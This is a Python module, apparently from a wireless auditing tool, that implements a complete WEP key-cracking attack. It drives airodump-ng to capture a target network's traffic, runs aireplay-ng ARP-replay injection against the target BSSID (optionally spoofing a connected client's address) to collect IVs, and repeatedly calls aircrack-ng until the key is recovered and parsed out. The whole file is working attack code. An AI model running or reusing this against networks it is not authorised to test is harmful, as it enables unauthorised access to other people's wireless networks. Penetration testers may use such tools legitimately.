"""WEP attack via ARP-replay and aircrack-ng."""

from __future__ import annotations

import os
import time
from datetime import datetime, timezone

from ..models import CrackResult, EncryptionType
from ..process import ManagedProcess, run, which
from ..tools.airodump import Airodump
from ..tools.interface import recover_interface
from .base import Attack, AttackResult


class WEPAttack(Attack):
    name = "wep"

    def can_attack(self) -> bool:
        return self.cfg.attack.wep and self.ap.encryption == EncryptionType.WEP

    def run(self) -> AttackResult:
        if not which("aireplay-ng") or not which("aircrack-ng"):
            return AttackResult(False, message="aireplay-ng/aircrack-ng not installed")

        self.tracker.clear_skip()
        started = time.time()
        timeout = self.cfg.attack.wep_timeout
        min_ivs = self.cfg.attack.wep_crack_ivs

        self.status("capture", "Starting WEP ARP-replay...", timeout=timeout, started=started)
        self.tracker.log(f"WEP attack on {self.ap.display_name}", tag="wep")

        iface = recover_interface(
            self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
        )
        self.cfg.scan.interface = iface

        capfile: str | None = None
        replay: ManagedProcess | None = None
        try:
            with Airodump(self.cfg, channel=self.ap.channel, bssid=self.ap.bssid, prefix="wep") as dump:
                if not dump.alive():
                    return AttackResult(False, message="airodump-ng failed to start")

                client = self.ap.clients[0].station if self.ap.clients else None
                replay = ManagedProcess([
                    "aireplay-ng", "-3", "-b", self.ap.bssid,
                    "-x", "600", iface,
                ] + (["-h", client] if client else []))

                deadline = time.time() + timeout
                last_crack = 0.0
                while time.time() < deadline:
                    if self.abort_if_skipped():
                        return self.skipped_result()

                    cap = dump.get_cap_file()
                    ivs = self.ap.ivs
                    targets = dump.parse_targets()
                    target = next((t for t in targets if t.bssid == self.ap.bssid), None)
                    if target:
                        ivs = target.ivs

                    remaining = int(deadline - time.time())
                    self.status(
                        "capture",
                        f"Collecting IVs: {ivs}/{min_ivs} ({remaining}s left)",
                        timeout=timeout,
                        started=started,
                    )

                    if cap and ivs >= min_ivs and time.time() - last_crack >= 30:
                        last_crack = time.time()
                        key = self._try_crack(cap)
                        if key:
                            capfile = cap
                            crack = CrackResult(
                                bssid=self.ap.bssid,
                                essid=self.ap.display_name,
                                key=key,
                                method="wep",
                                capture_file=capfile or "",
                                cracked_at=datetime.now(timezone.utc).isoformat(),
                            )
                            self.status("cracked", f"Key: {key}", started=started)
                            return AttackResult(True, crack=crack, message=f"WEP cracked: {key}")

                    if not dump.alive():
                        break
                    time.sleep(1)
                capfile = dump.get_cap_file()
        finally:
            if replay:
                replay.kill()

        if capfile and os.path.isfile(capfile):
            key = self._try_crack(capfile)
            if key:
                crack = CrackResult(
                    bssid=self.ap.bssid,
                    essid=self.ap.display_name,
                    key=key,
                    method="wep",
                    capture_file=capfile,
                    cracked_at=datetime.now(timezone.utc).isoformat(),
                )
                return AttackResult(True, crack=crack, message=f"WEP cracked: {key}")

        self.status("failed", "Insufficient IVs or crack failed", started=started)
        return AttackResult(False, message="WEP attack failed")

    def _try_crack(self, capfile: str) -> str | None:
        cmd = ["aircrack-ng", "-b", self.ap.bssid, capfile]
        stdout, _, _ = run(cmd, timeout=120)
        for line in stdout.splitlines():
            if "KEY FOUND" in line.upper():
                parts = line.split()
                for i, p in enumerate(parts):
                    if p.upper() == "FOUND" and i + 1 < len(parts):
                        return parts[i + 1].strip("[]")
            if line.strip().startswith("KEY FOUND!"):
                m = line.split("[", 1)
                if len(m) > 1:
                    return m[1].split("]")[0]
        return None